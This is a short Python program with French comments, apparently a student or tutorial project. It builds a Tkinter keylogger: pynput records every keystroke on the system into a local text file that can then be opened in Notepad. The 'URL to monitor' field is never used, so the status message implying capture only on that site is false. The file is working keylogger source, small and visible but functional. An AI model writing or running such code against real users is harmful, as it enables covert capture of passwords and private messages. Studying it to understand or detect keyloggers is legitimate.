from tkinter import *  # Importe tout depuis le module tkinter
from pynput import keyboard  # Importe le module keyboard du package pynput
import os  # Importe le module os pour effectuer des opérations sur le système d'exploitation

class KeyloggerGUI:  # Définit une nouvelle classe KeyloggerGUI

    def __init__(self, master):  # Constructeur de la classe KeyloggerGUI
        self.master = master  # Attribue la fenêtre principale à l'attribut self.master

        # Crée et affiche une étiquette avec le texte "Bienvenue sur le Keylogger"
        self.label = Label(master, text="Bienvenue sur le Keylogger")
        self.label.pack()

        # Crée et affiche une étiquette pour le champ de saisie de l'URL
        self.url_label = Label(master, text="URL à surveiller :")
        self.url_label.pack()

        # Crée et affiche un champ de saisie pour l'URL
        self.url_entry = Entry(master, width=50)
        self.url_entry.pack()

        # Crée et affiche un bouton "Démarrer" qui appelle la méthode start_logging
        self.start_button = Button(master, text="Démarrer", command=self.start_logging)
        self.start_button.pack()

        # Crée et affiche un bouton "Arrêter" qui appelle la méthode stop_logging
        self.stop_button = Button(master, text="Arrêter", command=self.stop_logging)
        self.stop_button.pack()

        # Crée et affiche un bouton "Ouvrir le fichier de log" qui appelle la méthode open_log_file_and_close
        self.open_log_button = Button(master, text="Ouvrir le fichier de log", command=self.open_log_file_and_close)
        self.open_log_button.pack()

        self.logger = None  # Initialise l'attribut self.logger à None

    def start_logging(self):  # Définit la méthode start_logging
        url = self.url_entry.get()  # Récupère l'URL saisie dans le champ de saisie

        # Vérifie si un URL a été saisi, affiche un message d'erreur sinon
        if not url:
            self.label.config(text="Veuillez saisir une URL à surveiller.")
            return

        # Crée un listener de clavier qui appelle la méthode keyboard_touch et le démarre
        self.logger = keyboard.Listener(on_press=self.keyboard_touch)
        self.logger.start()

        # Met à jour le texte de l'étiquette pour indiquer que le keylogger est en cours d'exécution sur l'URL spécifiée
        self.label.config(text=f"Keylogger en cours d'exécution sur {url}")

    def stop_logging(self):  # Définit la méthode stop_logging
        # Vérifie si le logger est en cours d'exécution, l'arrête sinon
        if self.logger:
            self.logger.stop()
            self.label.config(text="Le keylogger est arrêté.")

    def keyboard_touch(self, key):  # Définit la méthode keyboard_touch
        # Enregistre la frappe de touche dans le fichier de log
        with open("listkey.txt", 'a') as logs:
            logs.write(str(key) + '\n')

    def open_log_file_and_close(self):  # Définit la méthode open_log_file_and_close
        filename = "listkey.txt"  # Nom du fichier de log

        # Vérifie si le fichier de log existe, l'ouvre dans le Bloc-notes et ferme la fenêtre de l'interface graphique sinon
        if os.path.exists(filename):
            os.system(f"notepad.exe {filename}")
            self.master.destroy()  # Ferme la fenêtre principale
        else:
            self.label.config(text="Le fichier de log n'existe pas encore.")  # Affiche un message d'erreur

root = Tk()  # Crée une instance de la classe Tk pour créer la fenêtre principale
root.geometry("600x300")  # Définit la taille de la fenêtre principale
my_gui = KeyloggerGUI(root)  # Crée une instance de la classe KeyloggerGUI
root.mainloop()  # Lance la boucle principale de l'interface graphique
